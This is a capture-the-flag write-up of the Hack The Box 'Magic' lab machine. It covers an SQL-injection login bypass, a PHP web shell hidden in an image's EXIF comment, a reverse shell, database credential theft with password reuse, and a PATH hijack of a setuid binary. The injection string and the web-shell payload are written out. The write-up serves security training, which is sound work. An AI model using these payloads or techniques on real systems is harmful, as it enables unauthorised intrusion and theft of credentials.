I"46<p><strong><center>Ref°: HTB-14-Machine</center></strong></p>

<p>— Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an image to gain our “foothold”.</p>

<p>A lateral movement on the user theseus is possible through a leaked database and the presence in it of a password reused by this user.</p>

<p>Privilege elevation is achieved by exploiting the sysinfo binary and environment variables.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Information-Magic.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
<h3 id="network-service-scanning">Network Service Scanning</h3>
<hr />
<p>Nmap scan reveal 2 services on her usual port :</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">ssh</code> on port 22</li>
  <li><code class="language-plaintext highlighter-rouge">web</code> on port 80</li>
</ul>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.185 <span class="nt">-p-</span>
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-nmap.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="website">Website</h3>
<hr />
<p>We have portfolio website with possibility to see all pictures.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-website.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>And the capacity to <code class="language-plaintext highlighter-rouge">upload files</code> if we success to login.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-login_page.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>The login page is vulnerable to SQL Injection and we can bypass the authentication.</p>

<p>How we know that ?</p>

<p>Firstly, when we entered fake credential an error appear and present “Wrong Username or Password”.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-error_login.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>And when we entered only a single quote in to the “Username” field and submitted the request using the “Login” button, the error not appear.</p>

<p>This show us the website interprets this single quote and had potentially vulnerable to SQL Injection.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-injection_test.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>References - sql injection : <a href="https://portswigger.net/support/using-sql-injection-to-bypass-authentication">https://portswigger.net/support/using-sql-injection-to-bypass-authentication</a></p>

<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
<h3 id="bypassing-authentication-with-sql-injection">Bypassing Authentication with SQL Injection</h3>
<hr />
<p>Now, we used <code class="language-plaintext highlighter-rouge">' or 1=1 -- </code></p>

<p>This causes the application to perform the query:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'foo'
</code></pre></div></div>
<p>Because the comment sequence (–) causes the remainder of the query to be ignored, this is equivalent to:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM users WHERE username = ' ' OR 1=1
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-injection_bypass.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>And we got it! We able to upload images and gain foothold from this way.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-upload_page.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="obtaining-reverse-shell-with-payload-injection">Obtaining Reverse Shell with Payload Injection</h3>
<hr />
<p>The condition to upload allowed files are only <code class="language-plaintext highlighter-rouge">JPG, JPEG and PNG</code> extensions.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-upload_condition.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>We use <code class="language-plaintext highlighter-rouge">exiftool</code> to embed the payload into the picture to bypass this condition.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>exiftool <span class="nt">-Comment</span><span class="o">=</span><span class="s1">'&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); _halt_compiler() ?&gt;'</span> minion.jpg
<span class="gp">$</span><span class="w"> </span><span class="nb">mv </span>minion.jpg minion.php.jpg
</code></pre></div></div>
<p>We need to rename our file to <code class="language-plaintext highlighter-rouge">*.php.jpg</code> to bypass the restriction. Anyway the file is parsed as a PHP file and our payload is fully functional:</p>

<p>Upload the file :</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-upload_test.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>Payload execution :</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-exec_payload.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>Now we can use commands to control it with our web browser and leak for example <code class="language-plaintext highlighter-rouge">passwd</code> file.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-leak_passwd.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>We know the system user to exploit : <code class="language-plaintext highlighter-rouge">theseus</code></p>

<p>But we must obtain reverse shell to perform lateral movement on this user.</p>

<p>We use an other PHP payload we can find from : <a href="https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/">https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/</a> and proceed the same way.</p>

<p>We listening the correct port and get reverse shell by <code class="language-plaintext highlighter-rouge">www-data</code> :</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-nc_get_www-data.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>We gain finally our foothold.</p>

<h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
<h3 id="plaintext-password-from-database">Plaintext Password from database</h3>
<hr />
<p>We have website, the first interesting enumeration we can be realize is on folder <code class="language-plaintext highlighter-rouge">/var/www/*</code>.</p>

<p>Retrieve database information under <code class="language-plaintext highlighter-rouge">db.php5</code> file :</p>
<ul>
  <li>db name : <code class="language-plaintext highlighter-rouge">Magic</code></li>
  <li>db host : <code class="language-plaintext highlighter-rouge">localhost</code></li>
  <li>db username : <code class="language-plaintext highlighter-rouge">theseus</code></li>
  <li>db password : <code class="language-plaintext highlighter-rouge">iamkingtheseus</code></li>
</ul>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-info_db.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>I find php file to perform backup database on localhost such as for example : <a href="https://github.com/daniloaz/myphp-backup">https://github.com/daniloaz/myphp-backup</a></p>

<p>We retrieve the PHP file from Magic machine and execute to backup the database <code class="language-plaintext highlighter-rouge">Magic</code>.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-transfert_backup_php.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-backup_db.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-enum.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>We don’t have the rights to retrieve the backup.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-error_get_db.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>To bypass this restriction, rename the backup file <code class="language-plaintext highlighter-rouge">sql.gz</code> to <code class="language-plaintext highlighter-rouge">jpg</code> file.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-mv_db1.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-grab_db.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>Once we grab the file, we rename correctly and open the database.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-mv_db2.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>The database reveal new password <code class="language-plaintext highlighter-rouge">Th3s3usW4sK1ng</code>.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-db_check.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="reusing-password">Reusing Password</h3>
<hr />

<p>Theseus account reuse the same password.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-lateral_movement_theseus.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="flag-user">Flag user</h3>
<hr />

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-flag_user.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
<h3 id="persistence-with-ssh-authorized-keys">Persistence with SSH Authorized Keys</h3>
<hr />
<p>To proceed more easily, I make my ssh connection more persistent.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-make_ssh_persistent.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-connect_ssh_theseus.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<h3 id="setuid-path-modification-and-reverse-shell-with-payload-injection">Setuid, Path Modification and Reverse Shell with Payload Injection</h3>
<hr />
<p>The enumeration reveal interesting binary <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code>. The program run under root privilege but he can be launch by anybody from users group. Our account belongs to this group.</p>

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-suid.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>This program launch many module like <code class="language-plaintext highlighter-rouge">fdisk</code>, <code class="language-plaintext highlighter-rouge">cpuinfo</code> or <code class="language-plaintext highlighter-rouge">lshw</code>.</p>

<p>We using path variable to escalate our privilege by creating a named file of one of these modules with our bash reverse shell.</p>

<p>We modify an environment variable in order to make one of the modules run using the following path : <code class="language-plaintext highlighter-rouge">/tmp/privuser/</code></p>

<p>References - path environment : <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>

<p>We listening on our local machine and execute sysinfo program on Magic machine.</p>

<h3 id="flag-root">Flag root</h3>
<hr />

<table>
  <tbody>
    <tr>
      <td>![Desktop View]({{ “/assets/images/magic/HTB-Images-Magic-flag_root.png”</td>
      <td>relative_url }})</td>
    </tr>
  </tbody>
</table>

<p>Magic machine is compromised.</p>

<hr />

<h2 id="trophy"><strong><center>Trophy</center></strong></h2>

<blockquote>
  <p><strong>Any sufficiently advanced technology is indistinguishable from magic.</strong></p>

  <p>Arthur C. Clarke</p>
</blockquote>
:ET